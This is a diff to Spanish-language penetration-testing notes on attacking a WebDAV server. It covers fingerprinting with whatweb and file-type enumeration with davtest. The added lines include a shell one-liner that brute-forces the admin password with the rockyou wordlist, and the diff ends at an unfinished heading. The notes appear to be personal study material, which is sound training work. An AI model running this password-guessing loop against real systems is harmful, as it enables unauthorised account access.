@@ -8,4 +8,9 @@ Usaremos [[WHATWEB]] para identificar que tipo de tecnologías usa la pagina web
 `whatweb <URL_Victima>`
 
 Podemos usar una herramienta llamada [[DAVTEST]] nos enumera todos los tipos de archivos que se pueden subir a la web y cuales son ejecutables/interpretables, pero para ellos debemos de saber las credenciales
-`davtest -url http://localhost/ -auth `
+Si sabemos el nombre del usuario:
+```shell
+cat /usr/share/wordlists/rockyou.txt | while read password; do response=$(davtest -url <URL_Victima> -auth admin:$password 2>&1 | grep -i succeed); if [ $response ]; then echo "[+] La contraseña es $password"; break; fi; done
+```
+
+SI sabemos la contraseña: 
